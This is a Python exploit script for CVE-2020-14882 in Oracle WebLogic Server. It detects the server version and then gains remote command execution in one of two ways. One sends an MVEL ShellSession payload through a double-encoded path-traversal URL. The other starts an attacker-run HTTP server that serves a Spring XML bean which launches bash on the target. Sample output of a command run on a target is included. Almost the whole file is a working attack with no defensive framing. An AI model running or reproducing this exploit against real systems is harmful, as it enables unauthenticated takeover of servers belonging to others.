import requests, urllib, sys, optparse, http.client, time, threading
from packaging import version
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
from user_agent import generate_user_agent, generate_navigator
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
from http.server import BaseHTTPRequestHandler, HTTPServer

'''
% python3 CVE-2020-14882.py                   
[*] http://127.0.0.1:7001/console/login/LoginForm.jsp [version 12.2.1.3.0]
[*] Using: com.tangosol.coherence.mvel2.sh.ShellSession
Linux 96fc5d43736b 4.19.121-linuxkit #1 SMP Tue Dec 1 17:50:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

% python3 CVE-2020-14882.py                   
[*] http://172.16.164.134:7001/console/login/LoginForm.jsp [version 12.1.3.0.0]
[*] Using: com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext
'''

hostName = "0.0.0.0"
serverPort = 80

res = '''<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[#command#]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>'''

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/xml")
        self.end_headers()
        self.wfile.write(bytes(res, "utf-8"))
        
def getPage(url):
    try:
        headers={'User-Agent': generate_user_agent()}      
        r = requests.get(url, headers=headers, verify=False, timeout=15, allow_redirects=True)
        tmpData=r.text.encode('ascii','replace')
        return r.url,r.status_code,tmpData
    except Exception as e:
    	print(e)
    	return url,None,None

def method1(url,cmd):
	x=""
	try:
		x=urllib.parse.urlparse(url)
	except:
		x=urlparse(url)
	burp0_url = x.scheme+"://"+x.netloc+"/console/css/%252e%252e%252fconsole.portal"
	headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cmd': cmd
    }
	payload = ('_nfpb=true&_pageLabel=&handle='
            'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
            '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
            'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
            'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
            '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
            '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
            'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
            'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
	r=requests.post(burp0_url, headers=headers, data=payload, verify=False, timeout=15, stream=True)
	print(r.text)

def method2(url,listeningIP):
	x=""
	try:
		x=urllib.parse.urlparse(url)
	except:
		x=urlparse(url)
	burp0_url = x.scheme+"://"+x.netloc+"/console/css/%252e%252e%252fconsole.portal"
	burp0_headers = {"User-Agent": "curl/7.72.0", "Accept": "*/*", "cmd": "echo hello", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
	burp0_data = {"\r\n_nfpb": "true", "_pageLabel": '', "handle": "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://"+listeningIP+":"+str(serverPort)+"/test.xml);\")"}
	s=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

def startWebServer():
	webServer = HTTPServer((hostName, serverPort), MyServer)
	#print("Server started http://%s:%s" % (hostName, serverPort))
	webServer.serve_forever()

cmd="uname -a"
url="http://127.0.0.1:7001/console/login/LoginForm.jsp"
url="http://172.16.164.134:7001/console/login/LoginForm.jsp"

if __name__ == "__main__":  
	parser = optparse.OptionParser()
	parser.add_option('-u', '--url', action="store", dest="url", help="http://x.x.x.x:7001")
	parser.add_option('-c', '--command', action="store", dest="command", help="command to run (e.g. 'uname -a')")
	parser.add_option('-i', action="store", dest="listeningIP", help="IP address for web server to listen on")
	options, remainder = parser.parse_args()

	if options.url:
		url=options.url
	x=urllib.parse.urlparse(url)
	tmpUrl = x.scheme+"://"+x.netloc+"/console/login/LoginForm.jsp"
	tmpUrl,tmpStatusCode,tmpData=getPage(tmpUrl)
	if tmpStatusCode==200:
		soup = BeautifulSoup(str(tmpData),'html.parser')
		input = soup.find('p',{'id': 'footerVersion'})
		tmpVersion = input.text
		tmpVersion = tmpVersion.split("WebLogic Server Version: ")[1]
		print("[*] "+tmpUrl+" [version "+tmpVersion+"]")
		if version.parse("12.2.1") < version.parse(tmpVersion):
			print("[*] Using: com.tangosol.coherence.mvel2.sh.ShellSession")
			method1(url,cmd)
		else:
			print("[*] Using: com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext")
			if options.command:
				res = res.replace("#command#",options.command)		
				daemon = threading.Thread(name='daemon_server', target=startWebServer)
				daemon.setDaemon(True) 
				daemon.start()
				method2(url,options.listeningIP)
	else:
		print("[-] "+tmpUrl+" [not weblogic]")
